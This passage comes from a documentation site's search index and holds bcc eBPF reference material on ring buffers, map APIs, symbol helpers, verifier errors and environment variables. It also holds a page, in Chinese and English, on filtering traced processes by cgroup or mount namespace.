callback returns a negative value.</p> <p>Example:</p> <pre><code># loop with callback to print_event\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_poll(30)\n    except KeyboardInterrupt:\n        exit();\n</code></pre> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-ring_buffer_consume","title":"3. ring_buffer_consume()","text":"<p>Syntax: <code>BPF.ring_buffer_consume()</code></p> <p>This consumes from all open ringbuf ring buffers, calling the callback function that was provided when calling open_ring_buffer for each entry.</p> <p>Unlike <code>ring_buffer_poll</code>, this method does not poll for data before attempting to consume. This reduces latency at the expense of higher CPU consumption. If you are unsure which to use, use <code>ring_buffer_poll</code>.</p> <p>Example:</p> <pre><code># loop with callback to print_event\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_consume()\n    except KeyboardInterrupt:\n        exit();\n</code></pre> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#map-apis","title":"Map APIs","text":"<p>Maps are BPF data stores, and are used in bcc to implement a table, and then higher level objects on top of tables, including hashes and histograms.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-get_table","title":"1. get_table()","text":"<p>Syntax: <code>BPF.get_table(name)</code></p> <p>Returns a table object. This is no longer used, as tables can now be read as items from BPF. Eg: <code>BPF[name]</code>.</p> <p>Examples:</p> <pre><code>counts = b.get_table(\"counts\")\n\ncounts = b[\"counts\"]\n</code></pre> <p>These are equivalent.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-open_perf_buffer","title":"2. open_perf_buffer()","text":"<p>Syntax: <code>table.open_perf_buffers(callback, page_cnt=N, lost_cb=None)</code></p> <p>This operates on a table as defined in BPF as BPF_PERF_OUTPUT(), and associates the callback Python function <code>callback</code> to be called when data is available in the perf ring buffer. This is part of the recommended mechanism for transferring per-event data from kernel to user space. The size of the perf ring buffer can be specified via the <code>page_cnt</code> parameter, which must be a power of two number of pages and defaults to 8. If the callback is not processing data fast enough, some submitted data may be lost. <code>lost_cb</code> will be called to log / monitor the lost count. If <code>lost_cb</code> is the default <code>None</code> value, it will just print a line of message to <code>stderr</code>.</p> <p>Example:</p> <pre><code># process event\ndef print_event(cpu, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n    [...]\n\n# loop with callback to print_event\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    try:\n        b.perf_buffer_poll()\n    except KeyboardInterrupt:\n        exit()\n</code></pre> <p>Note that the data structure transferred will need to be declared in C in the BPF program. For example:</p> <pre><code>// define output data structure in C\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n[...]\n</code></pre> <p>In Python, you can either let bcc generate the data structure from C declaration automatically (recommended):</p> <pre><code>def print_event(cpu, data, size):\n    event = b[\"events\"].event(data)\n[...]\n</code></pre> <p>or define it manually:</p> <pre><code># define output data structure in Python\nTASK_COMM_LEN = 16    # linux/sched.h\nclass Data(ct.Structure):\n    _fields_ = [(\"pid\", ct.c_ulonglong),\n                (\"ts\", ct.c_ulonglong),\n                (\"comm\", ct.c_char * TASK_COMM_LEN)]\n\ndef print_event(cpu, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n[...]\n</code></pre> <p>Examples in situ: code, search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-items","title":"3. items()","text":"<p>Syntax: <code>table.items()</code></p> <p>Returns an array of the keys in a table. This can be used with BPF_HASH maps to fetch, and iterate, over the keys.</p> <p>Example:</p> <pre><code># print output\nprint(\"%10s %s\" % (\"COUNT\", \"STRING\"))\ncounts = b.get_table(\"counts\")\nfor k, v in sorted(counts.items(), key=lambda counts: counts[1].value):\n    print(\"%10d \\\"%s\\\"\" % (v.value, k.c.encode('string-escape')))\n</code></pre> <p>This example also uses the <code>sorted()</code> method to sort by value.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-values","title":"4. values()","text":"<p>Syntax: <code>table.values()</code></p> <p>Returns an array of the values in a table.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-clear","title":"5. clear()","text":"<p>Syntax: <code>table.clear()</code></p> <p>Clears the table: deletes all entries.</p> <p>Example:</p> <pre><code># print map summary every second:\nwhile True:\n    time.sleep(1)\n    print(\"%-8s\\n\" % time.strftime(\"%H:%M:%S\"), end=\"\")\n    dist.print_log2_hist(sym + \" return:\")\n    dist.clear()\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-items_lookup_and_delete_batch","title":"6. items_lookup_and_delete_batch()","text":"<p>Syntax: <code>table.items_lookup_and_delete_batch()</code></p> <p>Returns an array of the keys in a table with a single call to BPF syscall. This can be used with BPF_HASH maps to fetch, and iterate, over the keys. It also clears the table: deletes all entries. You should rather use table.items_lookup_and_delete_batch() than table.items() followed by table.clear(). It requires kernel v5.6.</p> <p>Example:</p> <pre><code># print call rate per second:\nprint(\"%9s-%9s-%8s-%9s\" % (\"PID\", \"COMM\", \"fname\", \"counter\"))\nwhile True:\n    for k, v in sorted(b['map'].items_lookup_and_delete_batch(), key=lambda kv: (kv[0]).pid):\n        print(\"%9s-%9s-%8s-%9d\" % (k.pid, k.comm, k.fname, v.counter))\n    sleep(1)\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-items_lookup_batch","title":"7. items_lookup_batch()","text":"<p>Syntax: <code>table.items_lookup_batch()</code></p> <p>Returns an array of the keys in a table with a single call to BPF syscall. This can be used with BPF_HASH maps to fetch, and iterate, over the keys. You should rather use table.items_lookup_batch() than table.items(). It requires kernel v5.6.</p> <p>Example:</p> <pre><code># print current value of map:\nprint(\"%9s-%9s-%8s-%9s\" % (\"PID\", \"COMM\", \"fname\", \"counter\"))\nwhile True:\n    for k, v in sorted(b['map'].items_lookup_batch(), key=lambda kv: (kv[0]).pid):\n        print(\"%9s-%9s-%8s-%9d\" % (k.pid, k.comm, k.fname, v.counter))\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-items_delete_batch","title":"8. items_delete_batch()","text":"<p>Syntax: <code>table.items_delete_batch(keys)</code></p> <p>It clears all entries of a BPF_HASH map when keys is None. It is more efficient than table.clear() since it generates only one system call. You can delete a subset of a map by giving an array of keys as parameter. Those keys and their associated values will be deleted. It requires kernel v5.6.</p> <p>Arguments:</p> <ul> <li>keys is optional and by default is None.</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-items_update_batch","title":"9. items_update_batch()","text":"<p>Syntax: <code>table.items_update_batch(keys, values)</code></p> <p>Update all the provided keys with new values. The two arguments must be the same length and within the map limits (between 1 and the maximum entries). It requires kernel v5.6.</p> <p>Arguments:</p> <ul> <li>keys is the list of keys to be updated</li> <li>values is the list containing the new values.</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide_en/#10-print_log2_hist","title":"10. print_log2_hist()","text":"<p>Syntax: <code>table.print_log2_hist(val_type=\"value\", section_header=\"Bucket ptr\", section_print_fn=None)</code></p> <p>Prints a table as a log2 histogram in ASCII. The table must be stored as log2, which can be done using the BPF function <code>bpf_log2l()</code>.</p> <p>Arguments:</p> <ul> <li>val_type: optional, column header.</li> <li>section_header: if the histogram has a secondary key, multiple tables will print and section_header can be used as a header description for each.</li> <li>section_print_fn: if section_print_fn is not None, it will be passed the bucket value.</li> </ul> <p>Example:</p> <pre><code>b = BPF(text=\"\"\"\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n    dist.increment(bpf_log2l(req-&gt;__data_len / 1024));\n    return 0;\n}\n\"\"\")\n[...]\n\nb[\"dist\"].print_log2_hist(\"kbytes\")\n</code></pre> <p>Output:</p> <pre><code>     kbytes          : count     distribution\n       0 -&gt; 1        : 3        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 211      |**********                            |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\n      32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 800      |**************************************|\n</code></pre> <p>This output shows a multi-modal distribution, with the largest mode of 128-&gt;255 kbytes and a count of 800.</p> <p>This is an efficient way to summarize data, as the summarization is performed in-kernel, and only the count column is passed to user space.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#11-print_linear_hist","title":"11. print_linear_hist()","text":"<p>Syntax: <code>table.print_linear_hist(val_type=\"value\", section_header=\"Bucket ptr\", section_print_fn=None)</code></p> <p>Prints a table as a linear histogram in ASCII. This is intended to visualize small integer ranges, eg, 0 to 100.</p> <p>Arguments:</p> <ul> <li>val_type: optional, column header.</li> <li>section_header: if the histogram has a secondary key, multiple tables will print and section_header can be used as a header description for each.</li> <li>section_print_fn: if section_print_fn is not None, it will be passed the bucket value.</li> </ul> <p>Example:</p> <pre><code>b = BPF(text=\"\"\"\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n    dist.increment(req-&gt;__data_len / 1024);\n    return 0;\n}\n\"\"\")\n[...]\n\nb[\"dist\"].print_linear_hist(\"kbytes\")\n</code></pre> <p>Output:</p> <pre><code>     kbytes        : count     distribution\n        0          : 3        |******                                  |\n        1          : 0        |                                        |\n        2          : 0        |                                        |\n        3          : 0        |                                        |\n        4          : 19       |****************************************|\n        5          : 0        |                                        |\n        6          : 0        |                                        |\n        7          : 0        |                                        |\n        8          : 4        |********                                |\n        9          : 0        |                                        |\n        10         : 0        |                                        |\n        11         : 0        |                                        |\n        12         : 0        |                                        |\n        13         : 0        |                                        |\n        14         : 0        |                                        |\n        15         : 0        |                                        |\n        16         : 2        |****                                    |\n[...]\n</code></pre> <p>This is an efficient way to summarize data, as the summarization is performed in-kernel, and only the values in the count column are passed to user space.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#12-open_ring_buffer","title":"12. open_ring_buffer()","text":"<p>Syntax: <code>table.open_ring_buffer(callback, ctx=None)</code></p> <p>This operates on a table as defined in BPF as BPF_RINGBUF_OUTPUT(), and associates the callback Python function <code>callback</code> to be called when data is available in the ringbuf ring buffer. This is part of the new (Linux 5.8+) recommended mechanism for transferring per-event data from kernel to user space. Unlike perf buffers, ringbuf sizes are specified within the BPF program, as part of the <code>BPF_RINGBUF_OUTPUT</code> macro. If the callback is not processing data fast enough, some submitted data may be lost. In this case, the events should be polled more frequently and/or the size of the ring buffer should be increased.</p> <p>Example:</p> <pre><code># process event\ndef print_event(ctx, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n    [...]\n\n# loop with callback to print_event\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_poll()\n    except KeyboardInterrupt:\n        exit()\n</code></pre> <p>Note that the data structure transferred will need to be declared in C in the BPF program. For example:</p> <pre><code>// define output data structure in C\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_RINGBUF_OUTPUT(events, 8);\n[...]\n</code></pre> <p>In Python, you can either let bcc generate the data structure from C declaration automatically (recommended):</p> <pre><code>def print_event(ctx, data, size):\n    event = b[\"events\"].event(data)\n[...]\n</code></pre> <p>or define it manually:</p> <pre><code># define output data structure in Python\nTASK_COMM_LEN = 16    # linux/sched.h\nclass Data(ct.Structure):\n    _fields_ = [(\"pid\", ct.c_ulonglong),\n                (\"ts\", ct.c_ulonglong),\n                (\"comm\", ct.c_char * TASK_COMM_LEN)]\n\ndef print_event(ctx, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n[...]\n</code></pre> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#13-push","title":"13. push()","text":"<p>Syntax: <code>table.push(leaf, flags=0)</code></p> <p>Push an element onto a Stack or Queue table. Raises an exception if the operation does not succeed. Passing QueueStack.BPF_EXIST as a flag causes the Queue or Stack to discard the oldest element if it is full.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#14-pop","title":"14. pop()","text":"<p>Syntax: <code>leaf = table.pop()</code></p> <p>Pop an element from a Stack or Queue table. Unlike <code>peek()</code>, <code>pop()</code> removes the element from the table before returning it. Raises a KeyError exception if the operation does not succeed.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#15-peek","title":"15. peek()","text":"<p>Syntax: <code>leaf = table.peek()</code></p> <p>Peek the element at the head of a Stack or Queue table. Unlike <code>pop()</code>, <code>peek()</code> does not remove the element from the table. Raises an exception if the operation does not succeed.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#helpers","title":"Helpers","text":"<p>Some helper methods provided by bcc. Note that since we're in Python, we can import any Python library and their methods, including, for example, the libraries: argparse, collections, ctypes, datetime, re, socket, struct, subprocess, sys, and time.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-ksym","title":"1. ksym()","text":"<p>Syntax: <code>BPF.ksym(addr)</code></p> <p>Translate a kernel memory address into a kernel function name, which is returned.</p> <p>Example:</p> <pre><code>print(\"kernel function: \" + b.ksym(addr))\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-ksymname","title":"2. ksymname()","text":"<p>Syntax: <code>BPF.ksymname(name)</code></p> <p>Translate a kernel name into an address. This is the reverse of ksym. Returns -1 when the function name is unknown.</p> <p>Example:</p> <pre><code>print(\"kernel address: %x\" % b.ksymname(\"vfs_read\"))\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-sym","title":"3. sym()","text":"<p>Syntax: <code>BPF.sym(addr, pid, show_module=False, show_offset=False)</code></p> <p>Translate a memory address into a function name for a pid, which is returned. A pid of less than zero will access the kernel symbol cache. The <code>show_module</code> and <code>show_offset</code> parameters control whether the module in which the symbol lies should be displayed, and whether the instruction offset from the beginning of the symbol should be displayed. These extra parameters default to <code>False</code>.</p> <p>Example:</p> <pre><code>print(\"function: \" + b.sym(addr, pid))\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-num_open_kprobes","title":"4. num_open_kprobes()","text":"<p>Syntax: <code>BPF.num_open_kprobes()</code></p> <p>Returns the number of open k[ret]probes. Can be useful for scenarios where event_re is used while attaching and detaching probes. Excludes perf_events readers.</p> <p>Example:</p> <pre><code>b.attach_kprobe(event_re=pattern, fn_name=\"trace_count\")\nmatched = b.num_open_kprobes()\nif matched == 0:\n    print(\"0 functions matched by \\\"%s\\\". Exiting.\" % args.pattern)\n    exit()\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-get_syscall_fnname","title":"5. get_syscall_fnname()","text":"<p>Syntax: <code>BPF.get_syscall_fnname(name : str)</code></p> <p>Return the corresponding kernel function name of the syscall. This helper function will try different prefixes and use the right one to concatenate with the syscall name. Note that the return value may vary in different versions of linux kernel and sometimes it will causing trouble. (see #2590)</p> <p>Example:</p> <pre><code>print(\"The function name of %s in kernel is %s\" % (\"clone\", b.get_syscall_fnname(\"clone\")))\n# sys_clone or __x64_sys_clone or ...\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#bpf-errors","title":"BPF Errors","text":"<p>See the \"Understanding eBPF verifier messages\" section in the kernel source under Documentation/networking/filter.txt.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-invalid-mem-access","title":"1. Invalid mem access","text":"<p>This can be due to trying to read memory directly, instead of operating on memory on the BPF stack. All kernel memory reads must be passed via bpf_probe_read_kernel() to copy kernel memory into the BPF stack, which can be automatic by the bcc rewriter in some cases of simple dereferencing. bpf_probe_read_kernel() does all the required checks.</p> <p>Example:</p> <pre><code>bpf: Permission denied\n0: (bf) r6 = r1\n1: (79) r7 = *(u64 *)(r6 +80)\n2: (85) call 14\n3: (bf) r8 = r0\n[...]\n23: (69) r1 = *(u16 *)(r7 +16)\nR7 invalid mem access 'inv'\n\nTraceback (most recent call last):\n  File \"./tcpaccept\", line 179, in &lt;module&gt;\n    b = BPF(text=bpf_text)\n  File \"/usr/lib/python2.7/dist-packages/bcc/__init__.py\", line 172, in __init__\n    self._trace_autoload()\n  File \"/usr/lib/python2.7/dist-packages/bcc/__init__.py\", line 612, in _trace_autoload\n    fn = self.load_func(func_name, BPF.KPROBE)\n  File \"/usr/lib/python2.7/dist-packages/bcc/__init__.py\", line 212, in load_func\n    raise Exception(\"Failed to load BPF program %s\" % func_name)\nException: Failed to load BPF program kretprobe__inet_csk_accept\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-cannot-call-gpl-only-function-from-proprietary-program","title":"2. Cannot call GPL only function from proprietary program","text":"<p>This error happens when a GPL-only helper is called from a non-GPL BPF program. To fix this error, do not use GPL-only helpers from a proprietary BPF program, or relicense the BPF program under a GPL-compatible license. Check which BPF helpers are GPL-only, and what licenses are considered GPL-compatible.</p> <p>Example calling <code>bpf_get_stackid()</code>, a GPL-only BPF helper, from a proprietary program (<code>#define BPF_LICENSE Proprietary</code>):</p> <pre><code>bpf: Failed to load program: Invalid argument\n[...]\n8: (85) call bpf_get_stackid#27\ncannot call GPL only function from proprietary program\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#environment-variables","title":"Environment Variables","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-kernel-source-directory","title":"1. Kernel source directory","text":"<p>eBPF program compilation needs kernel sources or kernel headers with headers compiled. In case your kernel sources are at a non-standard location where BCC cannot find then, its possible to provide BCC the absolute path of the location by setting <code>BCC_KERNEL_SOURCE</code> to it.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-kernel-version-overriding","title":"2. Kernel version overriding","text":"<p>By default, BCC stores the <code>LINUX_VERSION_CODE</code> in the generated eBPF object which is then passed along to the kernel when the eBPF program is loaded. Sometimes this is quite inconvenient especially when the kernel is slightly updated such as an LTS kernel release. Its extremely unlikely the slight mismatch would cause any issues with the loaded eBPF program. By setting <code>BCC_LINUX_VERSION_CODE</code> to the version of the kernel that's running, the check for verifying the kernel version can be bypassed. This is needed for programs that use kprobes. This needs to be encoded in the format: <code>(VERSION * 65536) + (PATCHLEVEL * 256) + SUBLEVEL</code>. For example, if the running kernel is <code>4.9.10</code>, then can set <code>export BCC_LINUX_VERSION_CODE=264458</code> to override the kernel version check successfully.</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/special_filtering/","title":"\u7279\u6b8a\u8fc7\u6ee4","text":"<p>\u67d0\u4e9b\u5de5\u5177\u5177\u6709\u7279\u6b8a\u7684\u8fc7\u6ee4\u80fd\u529b\uff0c\u4e3b\u8981\u7528\u4f8b\u662f\u8ddf\u8e2a\u8fd0\u884c\u5728\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\uff0c\u4f46\u8fd9\u4e9b\u673a\u5236\u662f\u901a\u7528\u7684\uff0c\u4e5f\u53ef\u4ee5\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\u4f7f\u7528\u3002</p>"},{"location":"tutorials/bcc-documents/special_filtering/#cgroups","title":"\u6309 cgroups\u8fc7\u6ee4","text":"<p>\u67d0\u4e9b\u5de5\u5177\u6709\u4e00\u4e2a\u901a\u8fc7\u5f15\u7528\u5916\u90e8\u7ba1\u7406\u7684\u56fa\u5b9a\u7684BPF\u54c8\u5e0c\u6620\u5c04\u6765\u6309cgroup\u8fc7\u6ee4\u7684\u9009\u9879\u3002</p> <p>\u547d\u4ee4\u793a\u4f8b\uff1a</p> <pre><code># ./opensnoop --cgroupmap /sys/fs/bpf/test01\n# ./execsnoop --cgroupmap /sys/fs/bpf/test01\n# ./tcpconnect --cgroupmap /sys/fs/bpf/test01\n# ./tcpaccept --cgroupmap /sys/fs/bpf/test01\n# ./tcptracer --cgroupmap /sys/fs/bpf/test01\n</code></pre> <p>\u4e0a\u8ff0\u547d\u4ee4\u5c06\u4ec5\u663e\u793a\u5c5e\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2acgroup\u7684\u8fdb\u7a0b\u7684\u7ed3\u679c\uff0c\u8fd9\u4e9bcgroup\u7684ID\u7531<code>bpf_get_current_cgroup_id()</code>\u8fd4\u56de\uff0c\u5e76\u5b58\u5728\u56fa\u5b9a\u7684BPF\u54c8\u5e0c\u6620\u5c04\u4e2d\u3002</p> <p>\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u521b\u5efaBPF\u54c8\u5e0c\u6620\u5c04\uff1a</p> <pre><code># bpftool map create /sys/fs/bpf/test01 type hash key 8 value 8 entries 128 \\\n        name cgroupset flags 0\n</code></pre> <p>\u8981\u5728\u65b0cgroup\u4e2d\u83b7\u53d6\u4e00\u4e2ashell\uff0c\u53ef\u4ee5\u4f7f\u7528\uff1a</p> <pre><code># systemd-run --pty --unit test bash\n</code></pre> <p>\u8be5shell\u5c06\u5728cgroup<code>/sys/fs/cgroup/unified/system.slice/test.service</code>\u4e2d\u8fd0\u884c\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>name_to_handle_at()</code>\u7cfb\u7edf\u8c03\u7528\u6765\u53d1\u73b0cgroup ID\u3002\u5728examples/cgroupid\u4e2d\uff0c\u60a8\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u83b7\u53d6cgroup ID\u7684\u7a0b\u5e8f\u793a\u4f8b\u3002</p> <pre><code># cd examples/cgroupid\n# make\n# ./cgroupid hex /sys/fs/cgroup/unified/system.slice/test.service\n</code></pre> <p>\u6216\u8005\uff0c\u4f7f\u7528Docker\uff1a</p> <pre><code># cd examples/cgroupid\n# docker build -t cgroupid .\n# docker run --rm --privileged -v /sys/fs/cgroup:/sys/fs/cgroup \\\n cgroupid cgroupid hex /sys/fs/cgroup/unified/system.slice/test.service\n</code></pre> <p>\u8fd9\u5c06\u4ee5\u4e3b\u673a\u7684\u5b57\u8282\u5e8f(hexadecimal string)\u6253\u5370\u51facgroup ID\uff0c\u4f8b\u5982<code>77 16 00 00 01 00 00 00</code>\u3002</p> <pre><code># FILE=/sys/fs/bpf/test01\n# CGROUPID_HEX=\"77 16 00 00 01 00 00 00\"\n# bpftool map update pinned $FILE key hex $CGROUPID_HEX value hex 00 00 00 00 00 00 00 00 any\n</code></pre> <p>\u73b0\u5728\uff0c\u901a\u8fc7systemd-run\u542f\u52a8\u7684shell\u7684cgroup ID\u5df2\u7ecf\u5b58\u5728\u4e8eBPF\u54c8\u5e0c\u6620\u5c04\u4e2d\uff0cbcc\u5de5\u5177\u5c06\u663e\u793a\u6765\u81ea\u8be5shell\u7684\u7ed3\u679c\u3002\u53ef\u4ee5\u6dfb\u52a0\u548c\u3002\u4eceBPF\u54c8\u5e0c\u6620\u5c04\u4e2d\u5220\u9664\u800c\u4e0d\u91cd\u65b0\u542f\u52a8bcc\u5de5\u5177\u3002</p> <p>\u8fd9\u4e2a\u529f\u80fd\u5bf9\u4e8e\u5c06bcc\u5de5\u5177\u96c6\u6210\u5230\u5916\u90e8\u9879\u76ee\u4e2d\u975e\u5e38\u6709\u7528\u3002</p>"},{"location":"tutorials/bcc-documents/special_filtering/#_2","title":"\u6309\u547d\u540d\u7a7a\u95f4\u9009\u62e9\u6302\u8f7d\u70b9\u8fdb\u884c\u8fc7\u6ee4","text":"<p>BPF\u54c8\u5e0c\u6620\u5c04\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u521b\u5efa\uff1a</p> <pre><code># bpftool map create /sys/fs/bpf/mnt_ns_set type hash key 8 value 4 entries 128 \\\n        name mnt_ns_set flags 0\n</code></pre> <p>\u4ec5\u6267\u884c<code>execsnoop</code>\u5de5\u5177\uff0c\u8fc7\u6ee4\u6302\u8f7d\u547d\u540d\u7a7a\u95f4\u5728<code>/sys/fs/bpf/mnt_ns_set</code>\u4e2d\uff1a</p> <pre><code># tools/execsnoop.py --mntnsmap /sys/fs/bpf/mnt_ns_set\n</code></pre> <p>\u5728\u65b0\u7684\u6302\u8f7d\u547d\u540d\u7a7a\u95f4\u4e2d\u542f\u52a8\u4e00\u4e2a\u7ec8\u7aef\uff1a</p> <pre><code># unshare -m bash\n</code></pre> <p>\u4f7f\u7528\u4e0a\u8ff0\u7ec8\u7aef\u7684\u6302\u8f7d\u547d\u540d\u7a7a\u95f4ID\u66f4\u65b0\u54c8\u5e0c\u6620\u5c04\uff1a</p> <pre><code>FILE=/sys/fs/bpf/mnt_ns_set\nif [ $(printf '\\1' | od -dAn) -eq 1 ]; then\n HOST_ENDIAN_CMD=tac\nelse\n  HOST_ENDIAN_CMD=cat\nfi\n\nNS_ID_HEX=\"$(printf '%016x' $(stat -Lc '%i' /proc/self/ns/mnt) | sed 's/.\\{2\\}/&amp;\\n/g' | $HOST_ENDIAN_CMD)\"\nbpftool map update pinned $FILE key hex $NS_ID_HEX value hex 00 00 00 00 any\n</code></pre> <p>\u5728\u8fd9\u4e2a\u7ec8\u7aef\u4e2d\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code># ping kinvolk.io\n</code></pre> <p>\u4f60\u4f1a\u770b\u5230\u5728\u4e0a\u8ff0\u4f60\u542f\u52a8\u7684<code>execsnoop</code>\u7ec8\u7aef\u4e2d\uff0c\u8fd9\u4e2a\u8c03\u7528\u88ab\u8bb0\u5f55\u4e0b\u6765\uff1a</p> <p>```sh</p>"},{"location":"tutorials/bcc-documents/special_filtering/#toolsexecsnooppy-mntnsmap-sysfsbpfmnt_ns_set","title":"tools/execsnoop.py --mntnsmap /sys/fs/bpf/mnt_ns_set","text":"<p>[sudo] password for mvb: PCOMM            PID    PPID   RET ARGS ping             8096   7970     0 /bin/ping kinvolk.io ```\u3002</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/special_filtering_en/","title":"Special Filtering","text":"<p>Some tools have special filtering capabilities, the main use case is to trace processes running in containers, but those mechanisms are generic and could be used in other cases as well.</p>"},{"location":"tutorials/bcc-documents/special_filtering_en/#filtering-by-cgroups","title":"Filtering by cgroups","text":"<p>Some tools have an option to filter by cgroup by referencing a pinned BPF hash map managed externally.</p> <p>Examples of commands:</p> <pre><code># ./opensnoop --cgroupmap /sys/fs/bpf/test01\n# ./execsnoop --cgroupmap /sys/fs/bpf/test01\n# ./tcpconnect --cgroupmap /sys/fs/bpf/test01\n# ./tcpaccept --cgroupmap /sys/fs/bpf/test01\n# ./tcptracer --cgroupmap /sys/fs/bpf/test01\n</code></pre> <p>The commands above will only display results from processes that belong to one of the cgroups whose id, returned by <code>bpf_get_current_cgroup_id()</code>, is in the pinned BPF hash map.</p> <p>The BPF hash map can be created by:</p> <pre><code># bpftool map create /sys/fs/bpf/test01 type hash key 8 value 8 entries 128 \\\n        name cgroupset flags 0\n</code></pre> <p>To get a shell in a new cgroup, you can use:</p> <pre><code># systemd-run --pty --unit test bash\n</code></pre> <p>The shell will be running in the cgroup <code>/sys/fs/cgroup/unified/system.slice/test.service</code>.</p> <p>The cgroup id can be discovered using the <code>name_to_handle_at()</code> system call. In the examples/cgroupid, you will find an example of program to get the cgroup id.</p> <pre><code># cd examples/cgroupid\n# make\n# ./cgroupid hex /sys/fs/cgroup/unified/system.slice/test.service\n</code></pre> <p>or, using Docker:</p> <pre><code># cd examples/cgroupid\n# docker build -t cgroupid .\n# docker run --rm --privileged -v /sys/fs/cgroup:/sys/fs/cgroup \\\n    cgroupid cgroupid hex /sys/fs/cgroup/unified/system.slice/test.service\n</code></pre> <p>This prints the cgroup id as a hexadecimal string in the host endianness such as <code>77 16 00 00 01 00 00 00</code>.</p> <pre><code># FILE=/sys/fs/bpf/test01\n# CGROUPID_HEX=\"77 16 00 00 01 00 00 00\"\n# bpftool map update pinned $FILE key hex $CGROUPID_HEX value hex 00 00 00 00 00 00 00 00 any\n</code></pre> <p>Now that the shell started by systemd-run has its cgroup id in the BPF hash map, bcc tools will display results from this shell. Cgroups can be added and removed from the BPF hash map without restarting the bcc tool.</p> <p>This feature is useful for integrating bcc tools in external projects.</p>"},{"location":"tutorials/bcc-documents/special_filtering_en/#filtering-by-mount-by-namespace","title":"Filtering by mount by namespace","text":"<p>The BPF hash map can be created by:</p> <pre><code># bpftool map create /sys/fs/bpf/mnt_ns_set type hash key 8 value 4 entries 128 \\\n        name mnt_ns_set flags 0\n</code></pre> <p>Execute the <code>execsnoop</code> tool filtering only the mount namespaces in <code>/sys/fs/bpf/mnt_ns_set</code>:</p> <pre><code># tools/execsnoop.py --mntnsmap /sys/fs/bpf/mnt_ns_set\n</code></pre> <p>Start a terminal in a new mount namespace:</p> <pre><code># unshare -m bash\n</code></pre> <p>Update the hash map with the mount namespace ID of the terminal above:</p> <pre><code>FILE=/sys/fs/bpf/mnt_ns_set\nif [ $(printf '\\1' | od -dAn) -eq 1 ]; then\n HOST_ENDIAN_CMD=tac\nelse\n  HOST_ENDIAN_CMD=cat\nfi\n\nNS_ID_HEX=\"$(printf '%016x' $(stat -Lc '%i' /proc/self/ns/mnt) | sed 's/.\\{2\\}/&amp;\\n/g' | $HOST_ENDIAN_CMD)\"\nbpftool map update pinned $FILE key hex $NS_ID_HEX value hex 00 00 00 00 any\n</code></pre> <p>Execute a command in this terminal:</p> <pre><code># ping kinvolk.io\n</code></pre> <p>You'll see 